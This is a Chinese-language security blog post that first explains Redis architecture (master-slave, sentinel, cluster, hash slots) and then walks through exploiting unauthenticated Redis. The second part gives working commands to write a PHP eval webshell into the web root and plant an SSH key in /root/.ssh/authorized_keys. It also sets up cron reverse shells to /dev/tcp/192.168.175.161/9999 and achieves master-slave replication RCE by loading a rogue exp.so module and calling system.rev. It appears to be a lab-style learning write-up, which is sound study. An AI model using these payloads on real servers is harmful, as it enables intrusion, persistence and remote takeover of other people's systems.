<!DOCTYPE html>
<html lang="en">
    <head>
  <!-- 元数据 -->
  <meta charset="utf-8">
  <link rel="icon" href="/images/icon.jpg">
  
  <title>java安全-redis | QWQ0QWQ&#39;s blog</title>
  
  <meta name="author" content="QWQ0QWQ" />
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="robots" content="index,follow" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="format-detection" content="telphone=no, email=no" />
  
    <meta name="keywords" content="java安全" />
  
  <meta name="description" content="java安全-redis1.什么是redisREmote DIctionary Server（Redis）是一个由 Salvatore Sanfilippo写的key-value存储系统。Redis是—个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于內存亦可持久化的日志型、Key-Value数据库，并提供多种语言的APl。它通常被称为数据结构服务器，因为值（value）可以是字符">
<meta property="og:type" content="article">
<meta property="og:title" content="java安全-redis">
<meta property="og:url" content="https://qwq0qwq.github.io/2024/02/10/java%E5%AE%89%E5%85%A8-redis/index.html">
<meta property="og:site_name" content="QWQ0QWQ&#39;s blog">
<meta property="og:description" content="java安全-redis1.什么是redisREmote DIctionary Server（Redis）是一个由 Salvatore Sanfilippo写的key-value存储系统。Redis是—个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于內存亦可持久化的日志型、Key-Value数据库，并提供多种语言的APl。它通常被称为数据结构服务器，因为值（value）可以是字符">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://qwq0qwq.github.io/images/icon.jpg">
<meta property="article:published_time" content="2024-02-10T13:45:55.000Z">
<meta property="article:modified_time" content="2024-02-10T14:27:17.292Z">
<meta property="article:author" content="QWQ0QWQ">
<meta property="article:tag" content="java安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://qwq0qwq.github.io/images/icon.jpg">
  
  <!-- 站点验证相关 -->
  
    
    
    
  
  <!-- 样式表文件 -->
  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
  
    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
    <script src="/js/kr-dark.min.js"></script>
  
  
    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
  
  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
  
  
    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
  
  
    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
  
  <!-- 不得不预先加载的一些JS文件 -->
  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
  
    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
  
  
  <style>
    
    
      @media(min-width:768px) {
        body.custom-background {
          background-image: url('/images/cover1.jpg');
        }
      }
    
  </style>
  
<meta name="generator" content="Hexo 6.3.0"></head>


    <body class="custom-background">
        <div id="kratos-wrapper">
    <div id="kratos-page">
        <div id="kratos-header">
            <header id="kratos-desktop-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="nav-header">
                        <nav id="kratos-menu-wrap">
                            <ul id="kratos-primary-menu" class="sf-menu">
                                
                                    
                                    
                                
                            </ul>
                        </nav>
                    </div>
                </div>
            </header>
            <header id="kratos-mobile-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="color-logo"><a href="/">QWQ0QWQ&#39;s blog</a></div>
                    <div class="nav-toggle">
                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
                            <i></i>
                        </a>
                    </div>
                </div>
            </header>
        </div>
        <div class="kratos-start kratos-hero-2">
            <!-- <div class="kratos-overlay"></div> -->
            <div class="kratos-cover kratos-cover-2 text-center">
                <div class="desc desc2 animate-box">
                    <a href="/">
                        <h2>QWQ0QWQ&#39;s blog</h2> <br />
                        <span></span>
                    </a>
                </div>
            </div>
        </div>

        <div id="kratos-blog-post">
            <div class="container">
                <div id="main" class="row">
                    

        

            <section class="col-md-8">

        

            <article itemscope itemtype="https://schema.org/Article">
    
    <link itemprop="mainEntityOfPage" href="https://qwq0qwq.github.io/2024/02/10/java%E5%AE%89%E5%85%A8-redis/">
    <div class="kratos-hentry kratos-post-inner clearfix">
        <header class="kratos-entry-header">
            
                <h1 class="kratos-entry-title text-center" itemprop="name headline">java安全-redis</h1>
            
            
            <ul class="kratos-post-meta text-center">
                <li><time datetime="2024-02-10T13:45:55.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2024-02-10</time></li>
                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
                    <i class="fa fa-user"></i> 作者 <span itemprop="name">QWQ0QWQ</span>
                </li>
                
                    <li>
                        <i class="fa fa-edit"></i> 
                        
                        
                            ~8.76K
                        
                        字
                    </li>
                
                
            </ul>
        </header>
        <div class="kratos-post-content">
            
            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                <div class="icon"><i class="fa fa-warning"></i></div>
                <div class="text"><p>本文最后编辑于 <time datetime="1707575237292"></time> 前，其中的内容可能需要更新。</p></div>
            </div>
            
            
            
            <hr />
            <div itemprop="articleBody"><h1 id="java安全-redis"><a href="#java安全-redis" class="headerlink" title="java安全-redis"></a>java安全-redis</h1><h2 id="1-什么是redis"><a href="#1-什么是redis" class="headerlink" title="1.什么是redis"></a>1.什么是redis</h2><p>REmote DIctionary Server（Redis）是一个由 Salvatore Sanfilippo写的key-value存储系统。Redis是—个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于內存亦可持久化的日志型、Key-Value数据库，并提供多种语言的APl。它通常被称为数据结构服务器，因为值（value）可以是字符串（String），哈希（Map），列表（List），集合（sets）和有序集合（sorted sets）等类型</p>
<p>redis的数据结构如下：</p>
<img src="/.io//02/10/java%E5%AE%89%E5%85%A8-redis/image-20240209111257999.png" class>

<h3 id="sql数据库和nosql数据库"><a href="#sql数据库和nosql数据库" class="headerlink" title="sql数据库和nosql数据库"></a>sql数据库和nosql数据库</h3><p>NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。SQL 数据库是关系型的，而 NoSQL 数据库是非关系型的。关系数据库管理系统 (RDBMS) 是结构化查询语言 (SQL) 的基础，可允许用户访问和操作高度结构化表中的数据。这是 MS SQL Server、IBM DB2、Oracle 和 MySQL 等数据库系统的基础模型。但是对于 NoSQL 数据库，数据访问语法可能因数据库而异。</p>
<h3 id="key-value"><a href="#key-value" class="headerlink" title="key-value"></a>key-value</h3><p>redis遵守 BSD 协议，是一个高性能的 key-value 数据库。</p>
<p>Redis 与其他 key - value 缓存产品有以下三个特点：</p>
<ul>
<li>Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。</li>
<li>Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</li>
<li>Redis支持数据的备份，即master-slave模式的数据备份</li>
</ul>
<h2 id="2-Redis-架构"><a href="#2-Redis-架构" class="headerlink" title="2.Redis 架构"></a>2.Redis 架构</h2><p>Redis 主要由有两个程序组成：</p>
<ul>
<li><p>Redis 客户端 redis-cli</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h host -p port -a password</span><br></pre></td></tr></table></figure>
</li>
<li><p>Redis 服务器 redis-server</p>
</li>
</ul>
<p>Redis 支持<strong>单机</strong>、<strong>主从</strong>、<strong>哨兵</strong>、<strong>集群</strong>多种架构模式</p>
<h3 id="单机模式"><a href="#单机模式" class="headerlink" title="单机模式"></a>单机模式</h3><p>　　单机模式顾名思义就是安装一个 Redis，启动起来，业务调用即可。例如一些简单的应用，并非必须保证高可用的情况下可以使用该模式。</p>
<img src="/.io//02/10/java%E5%AE%89%E5%85%A8-redis/image-20240209112710448.png" class>

<p>​		单机 Redis 能够承载的 QPS（每秒查询速率）大概在几万左右。取决于业务操作的复杂性，Lua 脚本复杂性就极高。假如是简单的 key value 查询那性能就会很高。</p>
<p>　　假设上千万、上亿用户同时访问 Redis，QPS 达到 10 万+。这些请求过来，单机 Redis 直接就挂了。系统的瓶颈就出现在 Redis 单机问题上，此时我们可以通过<strong>主从复制</strong>解决该问题，实现系统的高并发。</p>
<h3 id="主从模式"><a href="#主从模式" class="headerlink" title="主从模式"></a>主从模式</h3><p>​		Redis 的复制（Replication）功能允许用户根据一个 Redis 服务器来创建任意多个该服务器的复制品，其中被复制的服务器为主服务器（Master），而通过复制创建出来的复制品则为从服务器（Slave）。 只要主从服务器之间的网络连接正常，主服务器就会将写入自己的数据同步更新给从服务器，从而保证主从服务器的数据相同。</p>
<p>　　数据的复制是单向的，只能由主节点到从节点，简单理解就是从节点只支持读操作，不允许写操作。主要是读高并发的场景下用主从架构。主从模式需要考虑的问题是：当 Master 节点宕机，需要选举产生一个新的 Master 节点，从而保证服务的高可用性。</p>
<img src="/.io//02/10/java%E5%AE%89%E5%85%A8-redis/image-20240209113008481.png" class>

<p>个人理解就是既然数据量太大，那我就加设备，由一台设备为主导，多台设备辅助。不过存在一个问题就是主节点出问题，读写就存在问题。并且选择主节点需要人工干预。</p>
<h3 id="哨兵模式"><a href="#哨兵模式" class="headerlink" title="哨兵模式"></a>哨兵模式</h3><p>​		<img src="/.io//02/10/java%E5%AE%89%E5%85%A8-redis/image-20240209114311493.png" class></p>
<p>​		主从模式中，当主节点宕机之后，从节点是可以作为主节点顶上来继续提供服务，但是需要修改应用方的主节点地址，还需要命令所有从节点去复制新的主节点，整个过程需要人工干预。</p>
<p>　　于是，在 Redis 2.8 版本开始，引入了哨兵（Sentinel）这个概念，在<strong>主从复制的基础</strong>上，哨兵实现了<strong>自动化故障恢复</strong>。如上图所示，哨兵模式由两部分组成，哨兵节点和数据节点：</p>
<ul>
<li>哨兵节点：哨兵节点是特殊的 Redis 节点，不存储数据；</li>
<li>数据节点：主节点和从节点都是数据节点。</li>
</ul>
<p>Redis Sentinel 是分布式系统中监控 Redis 主从服务器，并提供主服务器下线时自动故障转移功能的模式。其中三个特性为：</p>
<ul>
<li>监控(Monitoring)：Sentinel 会不断地检查你的主服务器和从服务器是否运作正常；</li>
<li>提醒(Notification)：当被监控的某个 Redis 服务器出现问题时， Sentinel 可以通过 API 向管理员或者其他应用程序发送通知；</li>
<li>自动故障迁移(Automatic failover)：当一个主服务器不能正常工作时， Sentinel 会开始一次自动故障迁移操作。</li>
</ul>
<p>接下来我们了解一些 <strong>Sentinel</strong> 中的关键名词，然后系统讲解下哨兵模式的工作原理。</p>
<h4 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h4><p>　Sentinel 内部有 3 个定时任务，分别是：</p>
<ul>
<li>每 1 秒每个 Sentinel 对其他 Sentinel 和 Redis 节点执行 <code>PING</code> 操作（监控），这是一个<strong>心跳检测</strong>，是失败判定的依据。</li>
<li>每 2 秒每个 Sentinel 通过 Master 节点的 channel 交换信息（Publish&#x2F;Subscribe）；</li>
<li>每 10 秒每个 Sentinel 会对 Master 和 Slave 执行<strong>INFO</strong>命令，这个任务主要达到两个目的：<ul>
<li>发现 Slave 节点；</li>
<li>确认主从关系。</li>
</ul>
</li>
</ul>
<p>　</p>
<h4 id="主观下线"><a href="#主观下线" class="headerlink" title="主观下线"></a>主观下线</h4><p>　　所谓主观下线（Subjectively Down， 简称 SDOWN）指的是单个 Sentinel 实例对服务器做出的下线判断，即单个 Sentinel 认为某个服务下线（有可能是接收不到订阅，之间的网络不通等等原因）。</p>
<p>　　主观下线就是说如果服务器在给定的毫秒数之内， 没有返回 Sentinel 发送的 PING 命令的回复， 或者返回一个错误， 那么 Sentinel 会将这个服务器标记为主观下线（SDOWN）。</p>
<h4 id="客观下线"><a href="#客观下线" class="headerlink" title="客观下线"></a>客观下线</h4><p>　　客观下线（Objectively Down， 简称 ODOWN）指的是多个 Sentinel 实例在对同一个服务器做出 SDOWN 判断，并且通过命令互相交流之后，得出的服务器下线判断，然后开启 failover。</p>
<p>　　只有在足够数量的 Sentinel 都将一个服务器标记为主观下线之后， 服务器才会被标记为客观下线（ODOWN）。只有当 Master 被认定为客观下线时，才会发生故障迁移。</p>
<h4 id="仲裁"><a href="#仲裁" class="headerlink" title="仲裁"></a>仲裁</h4><p>　　仲裁指的是配置文件中的 <code>quorum</code> 选项。某个 Sentinel 先将 Master 节点标记为主观下线，然后会将这个判定通过 <code>sentinel is-master-down-by-addr</code> 命令询问其他 Sentinel 节点是否也同样认为该 addr 的 Master 节点要做主观下线。最后当达成这一共识的 Sentinel 个数达到前面说的 <code>quorum</code> 设置的值时，该 Master 节点会被认定为客观下线并进行故障转移。</p>
<p>　　<code>quorum</code> 的值一般设置为 Sentinel 个数的<strong>二分之一加 1</strong>，例如 3 个 Sentinel 就设置为 2。</p>
<h4 id="哨兵模式的工作原理"><a href="#哨兵模式的工作原理" class="headerlink" title="哨兵模式的工作原理"></a>哨兵模式的工作原理</h4><ol>
<li>每个 Sentinel 以每秒一次的频率向它所知的 Master，Slave 以及其他 Sentinel 节点发送一个 <code>PING</code> 命令；</li>
<li>如果一个实例（instance）距离最后一次有效回复 PING 命令的时间超过配置文件 <code>own-after-milliseconds</code> 选项所指定的值，则这个实例会被 Sentinel 标记为<strong>主观下线</strong>；</li>
<li>如果一个 Master 被标记为主观下线，那么正在监视这个 Master 的所有 Sentinel 要以每秒一次的频率确认 Master 是否真的进入主观下线状态；</li>
<li>当有<strong>足够数量的 Sentinel</strong>（大于等于配置文件指定的值）在<strong>指定的时间范围内确认</strong> Master 的确进入了主观下线状态，则 Master 会被标记为<strong>客观下线</strong>；</li>
<li>如果 Master 处于 <strong>ODOWN 状态</strong>，则投票自动选出新的主节点。将剩余的从节点指向新的主节点继续进行数据复制；</li>
<li>在正常情况下，每个 Sentinel 会以每 10 秒一次的频率向它已知的所有 Master，Slave 发送 <code>INFO</code> 命令；当 Master 被 Sentinel 标记为客观下线时，Sentinel 向已下线的 Master 的所有 Slave 发送 INFO 命令的频率会从 10 秒一次改为每秒一次；</li>
<li>若没有足够数量的 Sentinel 同意 Master 已经下线，Master 的客观下线状态就会被移除。若 Master 重新向 Sentinel 的 PING 命令返回有效回复，Master 的主观下线状态就会被移除。</li>
</ol>
<p>　　</p>
<h2 id="集群模式"><a href="#集群模式" class="headerlink" title="集群模式"></a>集群模式</h2><p>​		假设上千万、上亿用户同时访问 Redis，QPS 达到 10 万+。这些请求过来，单机 Redis 直接就挂了。系统的瓶颈就出现在 Redis 单机问题上，此时我们可以通过<strong>主从复制</strong>解决该问题，实现系统的高并发。</p>
<p>　　主从模式中，当主节点宕机之后，从节点是可以作为主节点顶上来继续提供服务，但是需要修改应用方的主节点地址，还需要命令所有从节点去复制新的主节点，整个过程需要人工干预。于是，在 Redis 2.8 版本开始，引入了<strong>哨兵（Sentinel）</strong>这个概念，在<strong>主从复制的基础</strong>上，哨兵实现了<strong>自动化故障恢复</strong>。</p>
<p>　　哨兵模式中，单个节点的写能力，存储能力受到单机的限制，动态扩容困难复杂。于是，Redis 3.0 版本正式推出 <strong>Redis Cluster 集群</strong>模式，有效地解决了 Redis 分布式方面的需求。Redis Cluster 集群模式具有<strong>高可用</strong>、<strong>可扩展性</strong>、<strong>分布式</strong>、<strong>容错</strong>等特性。</p>
<img src="/.io//02/10/java%E5%AE%89%E5%85%A8-redis/image-20240209115043789.png" class>

<p>Redis簇采用无中心结构，<strong>每个节点都可以保存数据</strong>和整个集群状态，每个节点都和其他所有节点连接。Cluster 一般由多个节点组成，节点数量至少为 6 个才能保证组成完整高可用的集群，其中三个为主节点，三个为从节点。三个主节点会分配槽，处理客户端的命令请求，而从节点可用在主节点故障后，顶替主节点。</p>
<p>　　如上图所示，该集群中包含 6 个 Redis 节点，3 主 3 从，分别为 M1，M2，M3，S1，S2，S3。除了主从 Redis 节点之间进行数据复制外，所有 Redis 节点之间采用 Gossip 协议进行通信，交换维护节点元数据信息。</p>
<p>　　总结下来就是：读请求分配给 Slave 节点，写请求分配给 Master，数据同步从 Master 到 Slave 节点。</p>
<h4 id="分片"><a href="#分片" class="headerlink" title="分片"></a>分片</h4><p>　	单机、主从、哨兵的模式数据都是存储在一个节点上，其他节点进行数据的复制。而单个节点存储是存在上限的，集群模式就是把数据进行<strong>分片</strong>存储，当一个分片数据达到上限的时候，还可以分成多个分片。</p>
<p>　　Redis Cluster 采用<strong>虚拟哈希槽分区</strong>，所有的键根据哈希函数映射到 0 ~ 16383 整数槽内，计算公式：<code>HASH_SLOT = CRC16(key) % 16384</code>。每一个节点负责维护一部分槽以及槽所映射的键值数据。</p>
<img src="/.io//02/10/java%E5%AE%89%E5%85%A8-redis/image-20240209115305046.png" class>

<p>​		Redis 簇 提供了灵活的节点扩容和缩容方案。在不影响集群对外服务的情况下，可以为集群添加节点进行扩容也可以下线部分节点进行缩容。可以说，槽是 Redis Cluster 管理数据的基本单位，集群伸缩就是槽和数据在节点之间的移动。</p>
<p>　　简单的理解就是：扩容或缩容以后，槽需要重新分配，数据也需要重新迁移，但是服务不需要下线。</p>
<p>　　假如，这里有 3 个节点的集群环境如下：</p>
<ul>
<li>节点 A 哈希槽范围为 0 ~ 5500；</li>
<li>节点 B 哈希槽范围为 5501 ~ 11000；</li>
<li>节点 C 哈希槽范围为 11001 ~ 16383。</li>
</ul>
<p>　　此时，我们如果要存储数据，按照 Redis Cluster 哈希槽的算法，假设结果是： CRC16(key) % 16384 &#x3D; 6782。 那么就会把这个 key 的存储分配到 B 节点。此时连接 A、B、C 任何一个节点获取 key，都会这样计算，最终通过 B 节点获取数据。</p>
<p>　　假如这时我们新增一个节点 D，Redis Cluster 会从各个节点中拿取一部分 Slot 到 D 上，比如会变成这样：</p>
<ul>
<li>节点 A 哈希槽范围为 1266 ~ 5500；</li>
<li>节点 B 哈希槽范围为 6827 ~ 11000；</li>
<li>节点 C 哈希槽范围为 12288 ~ 16383；</li>
<li>节点 D 哈希槽范围为 0 ~ 1265，5501 ~ 6826，11001 ~ 12287</li>
</ul>
<p>　　这种特性允许在集群中轻松地添加和删除节点。同样的如果我想删除节点 D，只需要将节点 D 的哈希槽移动到其他节点，当节点是空时，便可完全将它从集群中移除。</p>
<p>​		Redis 簇 为了保证数据的高可用性，加入了主从模式，<strong>一个主节点对应一个或多个从节点</strong>，主节点提供数据存取，从节点复制主节点数据备份，当这个主节点挂掉后，就会通过这个主节点的从节点选取一个来充当主节点，从而保证集群的高可用。</p>
<p>　　回到刚才的例子中，集群有 A、B、C 三个主节点，如果这 3 个节点都没有对应的从节点，如果 B 挂掉了，则集群将无法继续，因为我们不再有办法为 5501 ~ 11000 范围内的哈希槽提供服务。</p>
<p>　　所以我们在创建集群的时候，一定要为每个主节点都添加对应的从节点。比如，集群包含主节点 A、B、C，以及从节点 A1、B1、C1，那么即使 B 挂掉系统也可以继续正确工作。</p>
<p>　　因为 B1 节点属于 B 节点的子节点，所以 Redis 集群将会选择 B1 节点作为新的主节点，集群将会继续正确地提供服务。当 B 重新开启后，它就会变成 B1 的从节点。但是请注意，如果节点 B 和 B1 同时挂掉，Redis Cluster 就无法继续正确地提供服务了。</p>
<p>优点：</p>
<p>无中心架构；可扩展性，数据按照 Slot 存储分布在多个节点，节点间数据共享，节点可动态添加或删除，可动态调整数据分布；高可用性，部分节点不可用时，集群仍可用。通过增加 Slave 做备份数据副本。实现故障自动 failover，节点之间通过 gossip 协议交换状态信息，用投票机制完成 Slave 到 Master 的角色提升</p>
<p>缺点：</p>
<p>多主节点异步修改数据，数据一致性无法保证</p>
<h2 id="redis安全"><a href="#redis安全" class="headerlink" title="redis安全"></a>redis安全</h2><p>Redis默认端口：6379 sentinel.conf配置器端口为26379。Reids被设计用于在信任的环境中访问的被授权客户端使用，这就导致了如果因为配置不当，则导致未授权访问漏洞。</p>
<p>配置不当一般主要是两个原理：</p>
<ul>
<li><p>配置登录策略导致任意机器都可以登录 redis。</p>
</li>
<li><p>未设置密码或者设置弱口令。</p>
</li>
</ul>
<h4 id="Redis写入webshell"><a href="#Redis写入webshell" class="headerlink" title="Redis写入webshell"></a>Redis写入webshell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html/</span><br><span class="line">//切换目录到网站的根目录</span><br><span class="line"></span><br><span class="line">set x &quot;\n\n\n&lt;?php phpinfo();?&gt;\n\n\n&quot;</span><br><span class="line">//写入恶意代码phpinfo()</span><br><span class="line"></span><br><span class="line">set xx &quot;\n\n\n&lt;?php @eval($_POST[&#x27;1&#x27;]);?&gt;\n\n\n&quot;</span><br><span class="line">//写入一句话木马</span><br><span class="line"></span><br><span class="line">config set dbfilename a001.php</span><br><span class="line">//磁盘中生成木马文件a001.php</span><br><span class="line"></span><br><span class="line">save</span><br><span class="line">//进行保存</span><br></pre></td></tr></table></figure>

<h4 id="Redis密钥登录SSH"><a href="#Redis密钥登录SSH" class="headerlink" title="Redis密钥登录SSH"></a>Redis密钥登录SSH</h4><p>攻击机生成<code>ssh-rsa</code>密钥</p>
<p>然后在<code>.ssh</code>这个目录下 就生成了这两个文件</p>
<p>进行导出Key</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br></pre></td></tr></table></figure>

<p><code>\n\n</code>是为了防止乱码</p>
<p>把生成的key.txt 复制到redis&#x2F;src的目录下</p>
<p>进行写入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat key.txt | ./redis-cli -h 192.168.175.162 -a a001 -x set xxxx    </span><br></pre></td></tr></table></figure>

<p>进行查看 是成功写入的</p>
<p>切换目录到靶机的<code>/root/.ssh</code>目录下</p>
<p>设置文件名 并进行导出 最后记得保存</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename authorized_keys</span><br></pre></td></tr></table></figure>

<p>进行登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@ip</span><br></pre></td></tr></table></figure>

<h4 id="利用计划任务反弹shell"><a href="#利用计划任务反弹shell" class="headerlink" title="利用计划任务反弹shell"></a>利用计划任务反弹shell</h4><p>写入一句话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ip:6379&gt; set  xx   &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.175.161/9999 0&gt;&amp;1\n&quot;         #星号代表计划任务执行的时间</span><br><span class="line">OK</span><br><span class="line">ip:6379&gt; config set dir /var/spool/cron/   #设置导出的路径</span><br><span class="line">OK</span><br><span class="line">ip:6379&gt; config set dbfilename root  #设置导出的文件名</span><br><span class="line">OK</span><br><span class="line">ip:6379&gt; save   #保存</span><br><span class="line">OK</span><br><span class="line">ip:6379&gt; </span><br></pre></td></tr></table></figure>

<p>或者这样也是可以的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/rev-ip/port 0&gt;&amp;1\n\n&quot;|./redis-cli -h ip -a password -x set 1</span><br><span class="line">./redis-cli -h ip -a password config set dir /var/spool/cron/</span><br><span class="line">./redis-cli -h ip -a password config set dbfilename root</span><br><span class="line">./redis-cli -h ip -a password save</span><br></pre></td></tr></table></figure>

<h4 id="利用主从复制RCE"><a href="#利用主从复制RCE" class="headerlink" title="利用主从复制RCE"></a>利用主从复制RCE</h4><p>漏洞存在于4.X、5.X版本中，简单来讲就是</p>
<p>攻击者（主机）写一个so文件，然后通过 FULLRESYNC（全局）同步文件到受害人（从机）上。</p>
<p>下载两个脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/n0b0dyCN/redis-rogue-server</span><br><span class="line">//未授权</span><br><span class="line">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</span><br><span class="line">//Redis有密码</span><br></pre></td></tr></table></figure>

<p><strong>远程登录</strong></p>
<p>攻击机上执行 进行远程连接靶机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis_rogue_server.py -rhost ip -lhost local-ip -passwd password</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210718/1626565898_60f36d0ad7274ba46671f.png!small" alt="在这里插入图片描述"></p>
<p>他这里问你</p>
<p>i：直接拿到shell</p>
<p>还是r：反弹shell</p>
<p>输入ip和port</p>
<p>python进去pty</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<h4 id="本地Redis主从复制RCE反弹shell"><a href="#本地Redis主从复制RCE反弹shell" class="headerlink" title="本地Redis主从复制RCE反弹shell"></a>本地Redis主从复制RCE反弹shell</h4><p><strong>但是 如果目标机器仅仅允许本地进行登录的时候</strong></p>
<p>这个时候，我们可以通过配合其他漏洞，从目标本地登录 redis。然后手动执行脚本内写死的一些命令</p>
<p>将靶机 Redis作为从机，将攻击机器设置为主机</p>
<p>然后攻击机器会自动将一些恶意so文件同步给目标机器（从机），从而来实现对目标机器的远程命令执行。</p>
<p>还是用这两个脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/n0b0dyCN/redis-rogue-server</span><br><span class="line">//未授权</span><br><span class="line">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</span><br><span class="line">//Redis有密码</span><br></pre></td></tr></table></figure>

<p>但是要说一下</p>
<p><strong>将 redis-rogue-server的exp.so文件复制到 Awsome文件夹中使用，因为exp.so带 system模块</strong></p>
<p>开启监听</p>
<p><img src="https://image.3001.net/images/20210718/1626565901_60f36d0dea7137257e1fc.png!small" alt="在这里插入图片描述"></p>
<p>攻击机开启主服务器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis_rogue_server.py -v -path exp.so</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210718/1626565902_60f36d0e9035cd3722ce9.png!small" alt="在这里插入图片描述"></p>
<p>然后去靶机上</p>
<p>查看模块 可以看到是没有的可用的模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">module list</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210718/1626565903_60f36d0f6ab937f047148.png!small" alt="在这里插入图片描述"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">config set dir /tmp</span><br><span class="line">//一般tmp目录都有写权限，所以选择这个目录写入</span><br><span class="line">config set dbfilename exp.so</span><br><span class="line">//设置导出文件的名字 这里就是创建一个空文件</span><br><span class="line">slaveof 192.168.175.161 15000</span><br><span class="line">//进行主从同步，将恶意so文件写入到tmp文件</span><br><span class="line">//端口可以自定义</span><br></pre></td></tr></table></figure>

<p>然后就可以看到攻击机这边开始了同步</p>
<p><img src="https://image.3001.net/images/20210718/1626565904_60f36d105027cbe8e2cb7.png!small" alt="在这里插入图片描述"></p>
<p>关闭主从同步</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">slaveof NO ONE</span><br><span class="line">module load ./exp.so </span><br><span class="line">//加载写入的so文件模块</span><br><span class="line">module list</span><br><span class="line">//ັ查看恶意的so文件有没有写入成功</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210718/1626565905_60f36d116d52d9bf14ca9.png!small" alt="在这里插入图片描述"></p>
<p>执行反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system.rev 192.168.175.161 9999</span><br></pre></td></tr></table></figure>

<p>就是没有回显</p>
<p><img src="https://image.3001.net/images/20210718/1626565906_60f36d122f7e72b7568ea.png!small" alt="在这里插入图片描述"></p>
